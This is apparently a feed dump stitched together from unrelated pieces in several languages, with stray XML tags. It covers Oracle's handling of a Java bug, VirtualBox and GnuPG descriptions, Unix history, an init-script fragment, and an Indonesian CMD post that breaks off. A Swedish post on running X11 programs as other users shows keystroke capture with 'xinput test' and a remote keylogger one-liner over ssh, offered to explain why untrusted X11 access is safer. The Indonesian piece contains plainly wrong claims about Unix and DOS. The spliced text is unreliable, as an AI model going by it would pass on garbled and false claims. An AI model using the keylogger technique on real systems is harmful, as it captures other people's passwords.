Una de las cosas que me gusta del Software Libre es la transparencia de errores críticos en casos tan notables como Debian o Gentoo, donde los errores son revelados lo más antes posible y a su vez los parches son liberados en un tiempo corto. Sin embargo en el reportaje de Ars Technica a pesar de sus reiterados intentos por obtener una respuesta por parte de Oracle, la única información clara y oficial era que a pesar de la gravedad del bug el plan de actualización seguirá como si nada hubiera pasado escondiendo todo bajo la alfombra. Si, yo también vi eso como un error garrafal. 
Pero no todo ha sido malo para Java desde el cambio de dueño y Oracle esta reaccionando más rápido de lo que esperaríamos invirtiendo en esta área fundamental a petición de la comunidad (aunque usted no lo crea). Luego de una breve discusión acerca de la inminente necesidad de un jalón de orejas por el impacto que pueden tener estos errores en productos más nuevos como JavaFX, fue presentado a la comunidad Milton Smith como la nueva persona a cargo de la seguridad de Java SE y literalmente lo tiraron a los leones para que hubiera comunicación de ideas con la gente que usa Java en la calle. 
Luego de una breve discusión del reportaje de Ars Technica la respuesta del mismo Milton fue que un nuevo lanzamiento de Java estaba listo para instalar, ademas de que se habia elevado la alerta de seguridad y esto traería una pequeña modificación en la numeración de versiones de Java. Para los que están acostumbrados a desarrollar Software saben que este tipo de cosas no son como encender la tele y ver el programa de Chabelo, la respuesta fue muy rápida hablando en tiempos de desarrollo. 
El FUD ya esta hecho y con la popularidad de Java en juego veremos si es suficiente la buena voluntad y lanzamientos más frecuentes, por mi parte me encanta el valor agregado que genera escuchar a la comunidad  .

  <summary><![CDATA[primero una informacion del programa y luego el link de descarga  Oracle VM VirtualBox es un software de virtualización para arquitecturas x86/amd64, creado originalmente por la empresa alemana innotek GmbH. Actualmente es desarrollado por Oracle Corporation como parte de su familia de productos de virtualización. Por medio de esta aplicación es posible instalar sistemas operativos adicionales, conocidos como «sistemas invitados», dentro de otro sistema operativo «anfitrión», cada uno con su propio ambiente virtual. Entre los sistemas operativos soportados (en modo anfitrión) se encuentran GNU/Linux, Mac OS X, OS/2 Warp , Microsoft Windows, y Solaris/OpenSolaris, y dentro de ellos es posible virtualizar los sistemas operativos FreeBSD, GNU/Linux, OpenBSD, OS/2 Warp, Windows, Solaris, MS-DOS y muchos otros. La aplicación fue inicialmente ofrecida bajo una licencia de software privativo, pero en enero de 2007, después de años de desarrollo, surgió VirtualBox OSE (Open Source Edition) bajo la licencia GPL 2. Actualmente existe la versión privativa Oracle VM VirtualBox, que es gratuita únicamente bajo uso personal o de evaluación, y esta sujeta a la licencia de "Uso Personal y de Evaluación VirtualBox" (VirtualBox Personal Use and Evaluation License o PUEL) y la versión Open Source, VirtualBox OSE, que es software libre, sujeta a la licencia GPL. VirtualBox ofrece algunas funcionalidades interesantes, como la ejecución de maquinas virtuales de forma remota, por medio del Remote Desktop Protocol (RDP), soporte iSCSI, aunque estas opciones no están disponibles en la versión OSE.  descarga]]></summary>

VirtualBox is a general-purpose full virtualizer for x86 hardware. Targeted at server, desktop and embedded use, it is now the only professional-quality virtualization solution that is also Open Source Software. VirtualBox is a powerful x86 virtualization product for enterprise as well as home use. Not only is VirtualBox an extremely feature rich, high performance product for enterprise customers, it is also the only professional solution that is freely available as Open Source Software under the terms of the GNU General Public License. Presently, VirtualBox runs on Windows, Linux, Macintosh and OpenSolaris hosts and supports a large number of guest operating systems including but not limited to Windows (NT 4.0, 2000, XP, Server 2003, Vista, Windows 7), DOS/Windows 3.x, Linux (2.4 and 2.6), Solaris and OpenSolaris, and OpenBSD. VirtualBox is being actively developed with frequent releases and has an ever growing list of features, supported guest operating systems and platforms it runs on. Some of the features of VirtualBox are: - Modularity. VirtualBox has an extremely modular design with well-defined internal programming interfaces and a client/server design. This makes it easy to control it from several interfaces at once: for example, you can start a virtual machine in a typical virtual machine GUI and then control that machine from the command line, or possibly remotely. VirtualBox also comes with a full Software Development Kit: even though it is Open Source Software, you don’t have to hack the source to write a new interface for VirtualBox. - Virtual machine descriptions in XML. The configuration settings of virtual machines are stored entirely in XML and are independent of the local machines. Virtual machine definitions can therefore easily be ported to other computers. - Guest Additions for Windows and Linux. VirtualBox has special software that can be installed inside Windows and Linux virtual machines to improve performance and make integration much more seamless. Among the features provided by these Guest Additions are mouse pointer integration and arbitrary screen solutions (e.g. by resizing the guest window). - Shared folders. Like many other virtualization solutions, for easy data exchange between hosts and guests, VirtualBox allows for declaring certain host directories as “shared folders”, which can then be accessed from within virtual machines. A number of extra features are available with the full VirtualBox release only (see the “Editions” page for details): - Virtual USB Controllers. VirtualBox implements a virtual USB controller and allows you to connect arbitrary USB devices to your virtual machines without having to install device specific drivers on the host. - Remote Desktop Protocol. Unlike any other virtualization software, VirtualBox fully supports the standard Remote Desktop Protocol (RDP). A virtual machine can act as an RDP server, allowing you to “run” the virtual machine remotely on some thin client that merely displays the RDP data. - USB over RDP. With this unique feature, a virtual machine that acts as an RDP server can still access arbitrary USB devices that are connected on the RDP client. This way, a powerful server machine can virtualize a lot of thin clients that merely need to display RDP data and have USB devices plugged in. Changes in VirtualBox 4.1.20 (released 2012-08-20): * VMM: fixed a crash under rare circumstances for VMs running without hardware virtualization * VMM: fixed a code analysis bug for certain displacement instructions for VMs running without hardware virtualization * VMM: fixed an interpretion bug for TPR read instructions under rare conditions (AMD-V only) * Snapshots: fixed a crash when restoring an old snapshot when powering off a VM (bugs #9604, #10491) * VBoxSVC: be more tolerant against environment variables with strange encodings (bug #8780) * VGA: fixed wrong access check which might cause a crash under certain conditions * NAT: final fix for crashes under rare conditions (bug #10513) * Virtio-net: fixed the problem with receiving of GSO packets in Windows XP guests causing packet loss in host-to-VM transfers * HPET: several fixes (bugs #10170, #10306) * Clipboard: disable the clipboard by default for new VMs * BIOS: the PCI BIOS was not properly detected with the chipset type set to ICH9 (bugs #9301, #10327) * Mac OS X hosts: adaptions to Mountain Lion * Linux Installer: fixes for Gentoo Linux (bug #10642) * Linux guests: fixed mouse integration on Fedora 17 guests (bug #2306) * Linux Additions: compile fixes for RHEL/CentOS 6.3 (bug #10756) * Linux Additions: compile fixes for Linux 3.5-rc1 and Linux 3.6-rc1 (bug #10709) * Solaris host: fixed a guru meditation while allocating large pages (bug #10600) * Solaris host: fixed possible kernel panics while freeing memory * Solaris Installer: fixed missing icon for menu and desktop shortcuts

  <title><![CDATA[Aplicación software de seguridad, GNU Privacy Guard (GnuPG)]]></title>
  <summary><![CDATA[GNU PG se trata de un conjunto de aplicaciones software y herramientas criptográficas de implementación libre que no utiliza el algoritmo patentado IDEA, por lo que puede ser utilizado sin restricciones. Es compatible con PGP (Pretty Good Privacy) y cumple con las especificaciones del RFC2440 (OpenPGP). Se trata de una aplicación de software libre y puede ser libremente utilizado, distribuido y modificado bajo los términos de la Licencia Pública General GNU. 
 
La primera versión de esta aplicación software fue publicada el 7 de septiembre de 1999 y la versión estable actual es la 1.4.7. 
 
GnuPG, en si misma, es una utilidad de línea de comandos sin ninguna característica gráfica. Se trata de un motor de cifrado que puede ser utilizado directamente desde la línea de comandos, desde programas shell (shell scripts) o desde otro tipo de programas. Por lo tanto GnuPG puede ser considerado como un motor (backend) para otras aplicaciones. De todos modos, incluso si se utiliza desde la línea de comandos, proporciona toda la funcionalidad necesaria, lo que incluye un sistema interactivo de menús. El conjunto de órdenes de esta herramienta siempre será un superconjunto del que proporcione cualquier interfaz de usuario (frontend). 
 
Entre otras, estas son algunas de las carácterísticas de esta aplicación software:Reemplazo completo de PGP.
No utiliza algoritmos patentados.
Puede utilizarse como filtro.
Implementación completa de OpenPGP (vea RFC 2440 en RFC Editor ).
Funcionalidad mejorada con respecto a PGP y mejoras de seguridad con respecto a PGP 2.
Descifra y verifica mensajes de PGP 5, 6 y 7.
Soporta ElGamal, DSA, RSA, AES, 3DES, Blowfish, Twofish, CAST5, MD5, SHA-1, RIPE-MD-160 y TIGER.
Facilidad de implementación de nuevos algoritmos utilizando módulos.
Fuerza que el identificador de usuario (User ID) esté en un formato estándar.
Soporta fechas de caducidad de claves y firmas.
Soporta inglés, danés, holandés, esperanto, estonio, francés, alemán, japonés, italiano, polaco, portugués, ruso, español, sueco y turco.
Sistema de ayuda en línea.
Soporte integrado para servidores de claves HKP.
Limpia ficheros firmados con "firma en claro", que pueden ser procesados en lotes.
Soporta los sistemas operativos GNU/Linux, GNU/Hurd, FreeBSD, OpenBSD, NetBSD, Windows 95/98/NT/2000/ME/XP.

What is Linux? 
Linux is actually a common name for a variety of operating systems. A variety of companies market Linux and you might have heard of a few: Red Hat, Debian, Slackware, etc. Linux is good in that it is compatible with the popular programming language PHP. It is also favored by some web hosters in that in general it has a good security record and tends on average to be a stable operating system. Linux software is free. 
What is Unix? 
The last version mentioned is very close in comparison to the Linux versions. The main difference is the history of how the two versions came into being. Linux is an offshoot of the Unix operating system, where the Unix-based operating systems are refinements of Unix itself. Linux basically is a cousin to Unix-based operating systems. The main Unix-based operating systems are FreeBSD and OpenBSD. These operating system tend to be very stable once installed. OpenBSD also has the reputation of being very secure in that in the last six years it had only one security hole in the software itself. But OpenBSD does not allow everything; that it you have to sacrifice some flexibility for security. These operating systems are free as well. Generally Unix hosting companies are cheaper than NT (windows) hosting services, this is because the majority of Unix operating systems and software are freeware. 
Without a doubt Unix/Linux (nix, **nix) type hosting services are the most popular and if you intend to use perl programs on your site then we strongly recommend Unix, although Perl is available for Windows NT it not naturally supported. Most perl scripts available on the Internet are intended for Unix/Linux and some will include functions that will only work on a Unix/Linux system, such as the use of Sendmail. 
Many webmasters would agree that a combination of Perl and MySQL/mSQL on a Unix Server is the best combination for web hosting and database access, it’s cheap and can support many con-current threads. 
Choosing between a Windows hosting server and Unix/Linux hosts depends on the programs and scripts you want to run for your shopping cart, affiliate program, web site pages, etc. ASP, JSP, PHP, CGI, PL, CSS programs will influence the choice of a server and visa versa.

  <title><![CDATA[xsudo.sh – en skriptad X11-wrapper för sudo]]></title>
  <summary><![CDATA[För att fira slutet av min exil i Windows skriver jag en följetong om de olika program, inställningar och knep som gör mitt sätt att använda OpenBSD… ja, värt att fira. Gårdagens inlägg handlade om att byta plats på Escape och Caps lock, och var en uppfräschning av ett tidigare inlägg. I dag är det dags för en uppdatering av ett annat gammalt inlägg, som beskriver hur man kan köra X11-program som andra användare eller root. Själv använder jag den här metoden för att köra webbläsare som användaren _web med hemkatalogen /home/_web. Därigenom saknar webbläsaren skrivrättigheter under min hemkatalog, och kan inte sabba något. Eftersom jag dessutom kör med umask 077 i min .profile och med jämna mellanrum gör chmod -R og-rwx på min hemkatalog, kan webbläsarna inte heller läsa mina filer. Den enda nackdelen med det upplägget är inte så blodig: När jag vill ladda upp eller ned något genom webbläsaren måste jag låta filerna ifråga passera /tmp (som för övrigt töms automatiskt av OpenBSD vid uppstart, och dessutom är mountad async på min maskin). Det här upplägget borde fungera i de allra flesta X11-varianter, exempelvis X.org. sudo och $SUDO_ASKPASSDu känner kanske till gksudo och kdesudo, två grafiska sudo-prompter för GNOME respektive KDE? De är smidiga när man vill köra ett X11-program som någon annan användare eller root, men inte vill ta en omväg över xterm. Men de är utom räckhåll här, eftersom jag inte vill ha vare sig KDE eller GNOME. Som tur är behövs de inte heller, för samma funktionalitet uppstår i det närmaste av sig självt, om man bara har OpenSSH installerat. Det följande är klippt ur sudo (8): -A    Normally, if sudo requires a password, it will read it from
      the user's terminal.  If the -A (askpass) option is
      specified, a (possibly graphical) helper program is executed
      to read the user's password and output the password to the
      standard output.  If the SUDO_ASKPASS environment variable is
      set, it specifies the path to the helper program.  Otherwise,
      the value specified by the askpass option in sudoers(5) is
      used.  If no askpass program is available, sudo will exit
      with an error.Vi behöver med andra ord något enkelt program som visar ett fönster, läser in ett lösenord och sedan trycker ut det på standard output. Programmet heter ssh-askpass. Manualsidan ssh-askpass (1) menar att det inte ska köras direkt, men det struntar jag i. Följande skript skulle alltså kunna fungera:  Men ska det verkligen vara så lätt? Vi provar att köra xcalc som användaren _web: $ sh bin/xsudo.sh -Hu _web xcalc
No protocol specified
Error: Can't open display: :0Visst ja – användaren _web har ju ingen åtkomst till min X11-server. Det är nu allt blir krångligt. Display-åtkomst i X11Säkerhet och X11 går inte direkt hand i hand, och de säkerhetsmekanismer som faktiskt finns är svåranvända påbyggnader som alltjämt riskerar att rasa samman. När en X11-session startas på din maskin, så är det i själva verket två program som drar i gång. Först en X11-server, och sedan en X11-klient. Medan servern kör alla program är det klienten som direkt kommunicerar med dig via tangentbord, mus och skärm. En fördel med den modellen är att klient och server inte alls behöver vara på samma maskin. I vanliga fall, t.ex. på hemdatorer, ansluter klienten till servern via loopback-gränssnittet, alltså till adressen localhost eller 127.0.0.1. Det som i själva verket händer när xcalc försöker komma åt X11 i vårt xsudo-skript ovan, är att servern nekar användaren _web att ansluta. Tre lösningar på det problemet är vanligt förekommande. 
xhost kan användas för att ge full åtkomst till din X11-display åt en viss användare på samma maskin. (Programmet kan även ge full åtkomst till alla användare på valfri IP-adress, men det är en dålig idé.)
xauth kan användas för att ge full eller begränsad åtkomst till din X11-display åt en användare eller ett program, vare sig de finns på samma maskin eller någon annan.
ssh kan alternativt köras med X11 forwarding, och ger då begränsad åtkomst till din X11-display.
Vill vi använda begränsad eller full åtkomst? Det beror på. Begränsad åtkomst innebär att bland annat accelererad grafik och direkt åtkomst till X input devices inte fungerar. Grafiskt intensiva program, som exempelvis webbläsare faktiskt är, går därför långsammare med begränsad åtkomst. En annan nackdel är att AltGr kan sluta fungera. När det är möjligt bör man ändå använda begränsad åtkomst. Det är ganska lätt att visa varför. Om du själv vill prova det följande ska du se till att ha xinput på din maskin. kaja$ xhost +si:localuser:_web # Släpp in lokal användare '_web' i X11
localuser:_web being added to access control list
kaja$ xinput list # Lista alla input devices
+ Virtual core pointer                  id=2    [master pointer  (3)]
|   + Virtual core XTEST pointer        id=4    [slave  pointer  (2)]
|   + /dev/wsmouse0                     id=7    [slave  pointer  (2)]
|   + /dev/wsmouse                      id=8    [slave  pointer  (2)]
+ Virtual core keyboard                 id=3    [master keyboard (2)]
    + Virtual core XTEST keyboard       id=5    [slave  keyboard (3)]
    + /dev/wskbd                        id=6    [slave  keyboard (3)]

key release 40Vad var det egentligen som hände? Med xinput list listade jag alla aktiva X input devices, och kom fram till att tangentbordet var device nummer 6. Sedan körde jag xinput test 6 som användaren _web, och skrev därefter "password" i ett annat fönster, som jag körde i egenskap av mig själv. Trots att jag skrev i ett fönster som tillhörde användaren jesper, och till råga på allt i ett lösenordsfält, så kunde användaren _web se exakt vilka tangenter jag tryckte ned (och släppte upp, för den delen). Med andra ord kan vilket program som helst, oavsett vilken användare som kör det, avläsa alla nedslag på tangentbordet, oavsett vilket program som "egentligen" tar emot dem, så länge det har full åtkomst till X11-displayen. Exceptionellt illa. Så pass illa att om du bara lyckas peta in ett xhost localhost på någon dator du har åtkomst till via ssh, så är det följande en fungerande keylogger: kaja$ ssh struts xinput test 6…förutsatt att tangentbordet är device 6 på maskinen struts, då. Detta är förklaringen till varför xhost-autentisering mot någon annan dator än localhost är så dåligt. Med en sådan regel på plats behöver man inte ens ha tillgång till maskinen via exempelvis ssh, utan kan köra sin keylogger direkt mot maskinens IP-adress. Lätt skrämmande. Med begränsad åtkomst kan vi däremot inte göra några sådana hyss. I exemplet nedan ansluter jag till min egen maskin (som heter kaja) via ssh för att få en session utan full åtkomst.  kaja$ ssh -o ForwardX11=yes localhost
kaja$ xinput list
X Input extension not available.
kaja$ xinput test 6
X Input extension not available.Mycket bättre, men som sagt också fritt från både grafisk acceleration och AltGr. Vilken typ av autentisering ska vi då välja? Alternativ 3, alltså X11 över ssh, är inte intressant för oss, eftersom samma resultat kan uppnås utan att belasta processorn med en krypterad anslutning till localhost. Alternativ 1, alltså att köra xhost för en lokal användare, är visserligen användbart när vi behöver full åtkomst, men klarar inte att ge begränsad åtkomst. Vi vill kunna välja. Kvar blir alltså alternativ 2, att använda xauth, som givetvis är krångligast. xsudo.sh – en skriptad X11-wrapper för sudoEfter en blick (eller tjugotre) i xauth (1) verkar följande ordning gångbar: 
Skapa en tom, privat och tillfällig fil i /tmp.
Be X11-servern om en MIT-cookie (som är trusted eller untrusted beroende på om vi vill ha full eller begränsad åtkomst) och placera denna i den tillfälliga filen.
För över ägandet av den tillfälliga filen till användaren vi vill bli.
Kör sudo för användaren vi vill bli, med XAUTHORITY satt till vår temporära fil och DISPLAY till den X11-display som kakan vi skapat gäller för.
Ta bort den tillfälliga filen när sudo (och det program som sudo startat) avslutats.
Bäst att ge ett praktiskt exempel. Nedan körs xcalc som _web med begränsad åtkomst. $ umask 077                                 # Bli privat
$ mktemp                                    # Skaffa en tempfil
/tmp/tmp.OVZCpcwL4A
$ xauth -f /tmp/tmp.OVZCpcwL4A generate \   # Skapa cookie i filen...
    $DISPLAY \                              # ...för DISPLAY
    . \                                     # ...av MIT-COOKIE-typ
    untrusted                               # ...med begränsad åtkomst
$ sudo chown _web._web /tmp/tmp.OVZCpcwL4A  # Ge ägande till _web
$ sudo -AHu _web \                          # Bli _web...
    env DISPLAY=$DISPLAY \                  # ...med rätt X11-display
    env XAUTHORITY=/tmp/tmp.OVZCpcwL4A \    # ...och rätt MIT cookie
    xcalc                                   # ...och kör xcalc
$ rm -f /tmp/tmp.OVZCpcwL4A                 # Ta bort tempfilenOch för att hoppa över ett närmast oändligt antal steg: Så här ser ett skript som automatiserar processen ut:  (Givetvis kan du även läsa den senaste versionen av skriptet.) Hur använder man då skriptet? Vi kan ju börja med att testa det: kaja$ sh /usr/opt/bin/xsudo.sh whoami   
root
kaja$ sh /usr/opt/bin/xsudo.sh -u _web whoami
_web
kaja$ sh /usr/opt/bin/xsudo.sh -tu _web xinput list
+ Virtual core pointer                  id=2    [master pointer  (3)]
|   + Virtual core XTEST pointer        id=4    [slave  pointer  (2)]
|   + /dev/wsmouse0                     id=7    [slave  pointer  (2)]
|   + /dev/wsmouse                      id=8    [slave  pointer  (2)]
+ Virtual core keyboard                 id=3    [master keyboard (2)]
    + Virtual core XTEST keyboard       id=5    [slave  keyboard (3)]
    + /dev/wskbd                        id=6    [slave  keyboard (3)]
kaja$ sh /usr/opt/bin/xsudo.sh xinput list         
X Input extension not available.Lägg märke till hur flaggan -t ger sådan där otäck åtkomst till tangentbordet. Lägg även märke till att jag lagt skriptet i /usr/opt/bin/ i stället för under min hemkatalog; skript som kör sudo ska ägas av root och vara oskrivbara för andra användare. För att starta Chromium med xsudo.sh har jag kopplat ett menyalternativ i fönsterhanteraren till följande formel: /bin/sh /usr/opt/bin/xsudo.sh -tu _web /usr/local/bin/chromeTrots X11:s skrämmande brist på isolering mellan program kör jag alltså webbläsaren med full åtkomst, dels för att det går långsamt utan acceleration och dels för att det är tråkigt att behöva kopiera in tecken som @ och $ från något annat fönster – AltGr fungerar ju som sagt inte med begränsad åtkomst. Det får räcka med att webbläsaren inte kommer åt filerna under min hemkatalog. Pidgin klarar sig däremot utan sådana finesser: /bin/sh /usr/opt/bin/xsudo.sh -u _web /usr/local/bin/pidginOch tar man även bort "-u _web" ur ovanstående så körs pidgin förstås som root. Om du nu vill börja köra något program som en annan användare, så vill du antagligen även flytta över programmets dotfiles till den andra användarens hemkatalog, innan du drar i gång programmet. För Chromium och användaren _web ser processen ut så här: kaja$ umask 077
kaja$ sudo -u _web mkdir -p ~_web/.config
kaja$ sudo cp -r ~/.config/chromium ~_web/.config/
kaja$ sudo chown -R _web._web ~_web/.config/chromiumDet var det hela. Skriptet kommer bo och uppdateras på diskussionsforumet.]]></summary>

  <title><![CDATA[Unix Hakkında]]></title>
  <summary><![CDATA[Merhaba,  
Bu yazımda Unix hakkında genel bilgilendirme yapmak istiyorum. Yazı içeriğinin büyük çoğunluğunu Kaan Aslan(C ve Sistem Programcıları Derneği‘nin kurucusu ve yönetim kurulu başkanı)’nın C Programlama ders notlarından yola çıkarak aktaracağım. 
Kaan Aslan’dan İleri C ve Sistem Programlama ve Unix Sistem Programlama kurslarını almış biri olarak bana kattığı bilgi birikimi için kendisine ayrıca teşekkürlerimi iletiyorum. 
Unix ve işletim sistemi dili olan C Progrmalama dilinin hakkına birkaç bilgi paylaşalım. 
Unix, küçük olan güzeldir felsefesiyle ortaya çıkmış yalın bir işletim sistemidir. Unix AT&T’in Bell Laboratuvarında, Dennis Ritchie ve Ken Thompson tarafından tasarlanıp 1969-1970 yıllarında DEC-PDP 7 makinaları için üretilmiştir. Unix projesinden önce AT&T, MIT ve General Electric ile işbirliği yaparak Multics isimli bir işletim sistemi geliştirme projesinde çalışmıştır. Daha sonra grup çeşitli haklı gerekçelerle bu projeden çekilmiştir. 
Unix ismi B.Kernighan tarafından Multics sözcüğünden kelime oyunu yaparak uydurulmuştur. İlk Unix sistemi tamamen PDP makinalarının sembolik makine dilinde yazılmıştı. O yıllara kadar tüm işletim sistemleri zaten sembolik makine dilinde yazılıyordu.  
Unix işletim sistemi geliştirilirken Ken Thompson bir işletim sisteminin ciddi bir sistem olabilmesi için yüksek seviyeli bir derleyiciye sahip olması gerektiğini düşünüyordu. Thompson, önceleri Fortran üzerinde durduysa da daha sonra BCPL gibi bir sistemin daha uygun olduğuna karar vermiştir. Bundan sonra Thompson BCPL’nin benzeri olan B dilinin tasarımında da çalışmıştır. B bir yorumlayıcı sistemdi ve yavaş çalışıyordu. B programlama dili proje grubu tarafından yerel bir biçimde ve bazı sistem programlarında kullanılmıştır. 
Proje grubu K.Thompson, D.Ritchie, B.Kernighan gibi önemli kişilerden oluşuyordu. Grubun asıl amaçlarından biri Unix işletim sistemini yüksek seviyeli bir dille yeniden yazmaktı. D.Ritchie, B programlama dilini geliştirerek ilk kez 1971 yılında C programlama dilini tanımlamıştır. 
Bir PDP-11’de bilgisayar oyunu oynamak isteyen Dennis Ritchie ve Ken Thompson’ın Uzay Savaşları oynamaya yönelik kişisel projeleri için Unix işletim sistemlerini geliştirilmeye başlamıştı. 1973 yılında Unix işletim sistemi DEC-PDP 11 için çok büyük oranda C programlama dili ile yeniden yazılmıştır.  İşletim sistemi ciddi bir proje olarak görülmediği için AT&T onun ticari bir değeri olacağını hiç düşünmemişti. 
Unix, yüksek seviyeli bir programlama dili ile yazılmış olan ilk işletim sistemidir. Bu durum Unix işletim sisteminin farklı platformlarda yazılmasını çok kolaylaştırmıştır. AT&T düzeni önceden sıkı sıkya belirlenmiş bir tekeldi ve yapamayacağı şeylerden birisi de bilgisayar satmaktı. Böylece Unix’i yazanlar onu özellikle üniversiteler için özgürce, kaynak lisansı ile birlikte edinilebilir duruma getirdi. Bu durum C programlama dilinin tanınmasına yol açarken Unix sistemlerinin taşınabilirliğinin bozulması sonucunu da doğurmuştur. Çünkü kaynak kodları ele geçiren kurumlar orjinal Unix sistemlerinde değişiklikler yaparak farklı Unix sistemleri oluşturmuşlardır. 
Bu sistemlerin en önemlilerinden biri Berkeley Sistemleridir. Bu sistemler BSD(Berkeley Software Distribution) olarak bilinmektedir. Özellkle Bill Jolitz tarafından BSD kod tabanında oluşturulan ve dağıtımı internet üzerinde yapılan 386BSD projesi sözünü ettirmeye değer projelerdendir. Daha sonra BSD parçalara ayrılarak, ücretsiz elde edilecek  BSD sistemlerini (FreeBSD, NetBSD ve OpenBSD versiyonları) oluşturacaktı. 
80’li yıllarda pekçok özel firma da kendi Unix sistemlerini yazmış olacaktı. Sun firmasının Solaris, HP firmasının HP-UX, SCO firmasının SCO_UNIX, IBM firmasının AIX örnek olarak verebiliriz. 
AT&T 90’lı yılların başında Unix sistemlerine telif uygulamaya başlamış ve California-Berkeley Üniversitesi’ni dava etmiştir.Orjinal kod AT&T’nin idi ama sonraki çalışmaların büyük bölümü Berkeley’de yapılmıştı. Dava Novell şirketinin Unix’i AT&T’den satın almasıyla uzlaşmayla sonuçlandı . 
Bu durumdan tedirgin olan üniversiteler ve araştırıcılar bedava Unix sistemleri geliştirme yönünde motive olmuşlardır. Bunun üzerine Hollandalı profesor A.Tanenbaum işletim sistemi derslerinde kullanmak üzere Minix isminde mini bir Unix sistemi yazmıştır. Minix ticari amaçla çeşitli kesimler tarafından kullanılmış olsa da ciddi bir yaygınlık kazanmamıştır. Fakat kaynak kodları pek çok geliştiriciye ilham vermiştir. 
1984 yılında Richard Stallman FSF(Free Software Foundation) isimli bir kurum altında serbest yazılım fikrini ortaya atmıştır. Serbest yazılım bedava yazılımdan daha çok geliştirme özgürlüğünü benimsemektedir. Yani, programcı yazdığı programı kaynak kodu ile birlikte verir, kaynak kodu sahiplenip değiştirilmesini engelleyemez. Kaynak kodu elde eden programcı, orjinal yazardan alıntı yaptığını belirterek kodu değiştirebilir. Serbest yazılım bedava olabilir de olmayabilir de, fakat serbest yazılım parayla satılsa bile kaynak kodu verilmek zorundadır. Richard Stallman FSF kurumunu oluşturduktan sonra GNU isimli bir proje oluşturmuştur. GNU(GNU not UNIX) bir işletim sistemi ve yardımcı ek programlar oluşturmayı hedefleyen bir projedir. Bu proje hala devam etmektedir(www.fsf.org). 
GNU projesi kapsamında pekçok yararlı programlar yazılmıştır(gcc derleyicisi). Ancak malesef işletim sisteminin kendisi yazılamamıştır. 
Linus Torvalds 7 Eylül 1991 yılnda comp.os.minix haber grubuna üzerinde çalıştığı projeyi bildiren ve geliştirme için öneri isteyen bir mesaj göndermişti. Torvalds bu yeni işletim sistemine Linus’un Minix’i olarak tanımladığı Linux ismini verdi. 
Torvalds, GNU lisansı altında Minix ve Unix sistemlerinden alıntılarla serbest bir Unix sistemi oluşturmuştur. Bugün Linux sistemlerindeki yazılımlar GNU lisansı yazılımlarıdır. Yani, Linux sistemleri çekirdeği Linus Torvalds tarafından tasarlanmış olan yararlı programları GNU projesi kapsamıyla elde edilmiş olan bir sistemdir. Pek çok kişi bugün kullanılan bu sisteme Linux yerine GNU/Linux denmesinin daha uygun olacağını düşünmektedir. 
1994 yılının Mart ayında Linux 1.0 serisi kernel, GPL lisansı altında yayınlanmıştı. Günümüzde Linux’un milyonlar ile belirtilen bir kullanıcı kitlesi bulunmaktadır. Son kullanıcı pazarında da gün geçtikçe güçlenmesine rağmen çoğunlukla sunucularda kullanılan bir işletim sistemidir. Yapılan araştırmalarda Internet’te bulunan web sunucularının büyük çoğunluğu Linux işletim sistemi üzerinde çalışmaktadır. 
1980’li yılların sonlarına doğru UNIX sistemleri standart hale getirilmeye çalışılmıştır. Bunun için IEEE bünyesinde standardizasyon ekibi kurulmuş ve POSIX standartları diye bilinen standartlar oluşturulmuştur. POSIX, bir grup standartlardan oluşan bir standartlar topluluğudur. Bu grup içerisindeki herbir standart POSIX 1003.X biçiminde isimlendirilmiştir. Örneğin, 1003.1 POSIX uyumlu UNIX sistemlerinin C’de bulundurması gereken sistem fonksiyonlarına ayrılmıştır. 1003.2 Shell programlarının kullandığı standart komutları tanımlamaktadır.

*) 
echo “Operação inválida” 
;; 
esac 
Dê permissão de execução para o script: 



# chmod +x meuScript



A partir desse momento você já pode executar os comandos abaixo: 



# /etc/init.d/meuScript start
# /etc/init.d/meuScript stop
# /etc/init.d/meuScript restart



Para inserir o script na inicialização do sistema, usamos o comando update-rc.d da seguinte maneira: 



# update-rc.d meuScript defaults



O “meuScript” é o nome do script em /etc/init.d, não o caminho completo a ele, ou seja, não importa em qual diretório você está, apenas coloque o nome do script. 
O “defaults” indica que desejamos inserir o script nos runlevels padrões do sistema. 
Ao executar esse comando, um warning será mostrado, apesar de o comando ter funcionado. Aparecerá uma mensagem como esta: 
“update-rc.d: warning: /etc/init.d/meuScript missing LSB information 
 update-rc.d: see ” 
Você pode ignorá-lo ou inserir as informações de LSB, o que é mostrado no link exibido no warning. É algo bem simples. =) 
Para remover um script da inicialização: 



# update-rc.d -f meuScript remove



Como prometi, vou mostrar um exemplo que uso para uma instalação manual do Apache: 



#!/bin/bash
#
# /etc/init.d/apache2

  <summary><![CDATA[Command Prompt atau CMD.  Siapa sih yang ga kenal salah satu komponen dari windows tersebut? Pasti kalian semua yang menggunakan windows sudah tahu.CMD atau Command Prompt adalah salah satu komponent seperti windows ( OS ) yang berbasis DOS ( Disk Operating SYstem ) atau CMD adalah OS yang berbasiskan "TEXT". Apa maksudnya? Maksudnya adalah OS biasa namun tidak memiliki tampilan ( Interface ) melainkan hanya ada Text, Text, dan Text. Kita bicarakan dulu DOSDOS? apasih DOS itu?DOS adalah singkatan dari ( Disk Operating System ), DOS adalah Operating System berbasiskan TEXT yang dibuat pada tahun 1981 dan diluncurkan oleh Microsoft. Apa 1981? Ya, tahun 1981. Kalian mungkin belum lahir dan mungkin tidak mau menggunakan ini, tetapi jangan salah DOS ini masih dipakai hingga SEKARANG ( 1981 - 2012 ). jika Dos Berbasis TEXT lain cerita jika Unix, kita akan bicarakan Unix. Unix adalah Operating System berbasiskan Jaringan ( Network ).Unix memiliki 3 jenis yaitu :- Unix itu sendiri- OpenBSD- FreeBSD Ketiga jenis itu terdapat pada komputer IBM, ada yang masih pakai IBM? Oke. Kita sudah membicarakan DOS dan sedikit tentang CMD, kita akan bandingkan dengan OS GUI. Ketahanan/kekuatan:Jika kita membandingkan kekuatan/ketahanan OS, yang lebih kuat itu OS  yang berbasis Text. Kenapa? Karena Jarang sekali ada virus pada OS berbasis DOS. Efektifitas:Jika kita membandingkan efektifitas pasti susah. Pada kondisi tertentu OS berbasis DOS bisa paling efektif, bisa juga sebaliknya. Tapi menurut saya lebih efektif berbasis DOS Kelebihan berbasis DOS- Tahan terhadap Virus, Hacker- Bisa membuat kebih dari 1 folder dalam 1 Command Kekurangan berbasis DOS- Tidak MultiFungsi- Tidak MultiUsers- Tidak BerInterface   Dan jika ingin menggunakan CMD dan rasakan Kelebihannya saya akan memberitahukan intruksi dasar yang mungkin sudah banyak yang tahu. Karena intruksi CMD Windows XP dengan Se7en, Ei8ht berbeda jadi saya akan berikan dua jenis.  Intruksi CMD Windows XP: Intruksi Mengcopy "FILE" Copy [Tempat Asal] [Tempat Tujuan]    ( Jika Nama file terdapat Spasi 